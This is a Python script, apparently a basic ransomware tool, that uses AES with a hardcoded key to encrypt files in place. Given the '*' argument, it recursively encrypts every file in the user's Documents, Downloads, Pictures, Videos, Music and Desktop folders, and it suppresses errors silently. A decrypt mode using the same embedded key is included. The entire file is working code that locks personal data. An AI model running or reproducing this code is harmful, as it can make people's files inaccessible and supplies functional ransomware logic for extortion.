import sys
import os
import glob
from Crypto.Cipher import AES

# For generating cipher text
secret_key = b"HotzFellas000000"
iv = b"HotzFellas000000"


def encrypt(file):
    # Encrypt the file

    # Read file
    with open(file, 'rb') as f:
        plaintext = f.read()

    # Encrypt the file
    cipher = AES.new(secret_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    # Save the file
    with open(file, "wb") as f:
        file_out = open(file, "wb")
        [file_out.write(x) for x in (cipher.nonce, tag, ciphertext)]


def decrypt_file(file):
    # Decrypt the file

    # Read file
    with open(file, "rb") as f:
        nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]

    # Decrypt the file
    cipher = AES.new(secret_key, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # Save the file
    with open(file, "wb") as f:
        f.write(data)


# Recursively list files in home directory
def list_files(path):
    files_list = []

    for file in glob.glob(path + "**", recursive=True):
        # Check if is a file
        if os.path.isfile(file):
            files_list.append(file)

    return files_list


def run_operation(operation, path):
    # Encrypt/decrypt files
    try:
        if operation == "e":
            encrypt(path)
        elif operation == "d":
            decrypt_file(path)
    except PermissionError:
        # print("Perm error on" + f)
        pass
    except ValueError:
        # print("Mac check failed on" + f)
        pass


# Get home directory
home_path = os.path.expanduser('~')
home_path = home_path + "/"

# "e" is encrypt, "d" is decrypt
operation = sys.argv[1]
# Path of file to encrypt/decrypt. * = everything
file_to_modify = sys.argv[2]

if file_to_modify == "*":
    # Encrypt all files in home directory

    # List of folders to encrypt in the home directory
    directories_to_encrypt = ["Documents/", "Downloads/",
                              "Pictures/", "Videos/", "Music/", "Desktop/"]

    # Loop through each directory to encrypt
    for directory in directories_to_encrypt:
        # Get list of file in home directory
        files = list_files(home_path + directory)

        # Loop through each file in the directory (including subfolders)
        for f in files:
            if f.split('\\')[-1] == "desktop.ini":
                continue
            run_operation(operation, f)
else:
    # Encrypt/decrypt a single file
    run_operation(operation, file_to_modify)
